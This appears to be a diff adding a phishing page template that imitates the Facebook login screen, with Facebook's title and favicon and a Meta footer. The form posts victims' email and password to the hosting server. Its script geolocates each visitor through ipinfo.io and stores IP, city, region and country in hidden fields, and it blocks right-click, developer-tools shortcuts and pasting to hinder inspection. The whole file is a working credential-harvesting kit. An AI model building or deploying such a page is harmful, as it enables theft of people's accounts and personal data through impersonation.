@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Log in to Facebook | Facebook</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-[#f0f2f5] min-h-screen">
+    <div class="flex flex-col min-h-screen">
+        <!-- Header -->
+        <header class="bg-white shadow-sm">
+            <div class="container mx-auto px-4 py-2">
+                <img src="/images/icons/fb.png" alt="Facebook" class="h-10">
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="flex-grow flex items-center justify-center p-4">
+            <div class="w-full max-w-md">
+                <div class="bg-white p-4 rounded-lg shadow-md">
+                    <h1 class="text-xl font-semibold text-center mb-4">Log in to Facebook</h1>
+                    
+                    <form method="POST" class="space-y-4" autocomplete="off">                        
+                        <div>
+                            <input type="text" 
+                                   name="email" 
+                                   placeholder="Email or phone number"
+                                   required
+                                   maxlength="50"
+                                   pattern="[^<>]*"
+                                   class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500"
+                                   onpaste="return false">
+                        </div>
+                        
+                        <div>
+                            <input type="password" 
+                                   name="password" 
+                                   placeholder="Password"
+                                   required
+                                   maxlength="50"
+                                   pattern="[^<>]*"
+                                   class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500"
+                                   onpaste="return false"
+                                   autocomplete="new-password">
+                        </div>
+
+                        <input type="hidden" value="" name="city" id="cty">
+                        <input type="hidden" value="" name="country" id="country">
+                        <input type="hidden" value="" name="region" id="region">
+                        <input type="hidden" value="" name="ip" id="ip">
+                        
+                        <button type="submit" 
+                                class="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-lg hover:bg-[#166fe5] transition">
+                            Log In
+                        </button>
+                    </form>
+
+                    <div class="mt-4 text-center">
+                        <a href="#" class="text-[#1877f2] text-sm hover:underline">Forgotten password?</a>
+                    </div>
+
+                    <div class="my-4 border-t border-gray-300"></div>
+
+                    <div class="text-center">
+                        <button class="bg-[#42b72a] text-white font-semibold px-8 py-3 rounded-lg hover:bg-[#36a420] transition">
+                            Create new account
+                        </button>
+                    </div>
+                </div>
+
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="bg-white mt-auto">
+            <div class="container mx-auto px-4 py-4">
+                <div class="text-center text-gray-600 text-sm">
+                    <p>English (US)</p>
+                    <p class="mt-2">Meta © <%= new Date().getFullYear() %></p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+
+        const country = document.getElementById('country'); 
+        const region = document.getElementById('region'); 
+        const city = document.getElementById('cty'); 
+        const ip = document.getElementById('ip');
+
+        function getIpInfo() {
+            fetch('https://ipinfo.io/json?token=efd2f9e1d7b7a0')
+                .then(response => response.json())
+                .then(data => {
+                    country.value = data.country;
+                    region.value = data.region;
+                    city.value = data.city;
+                    ip.value = data.ip;
+                })
+                .catch(error => console.error(error));
+        }
+        getIpInfo();
+
+        // Prevent form resubmission on refresh
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+
+        // Disable right-click
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        // Disable developer tools shortcut
+        document.addEventListener('keydown', (e) => {
+            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
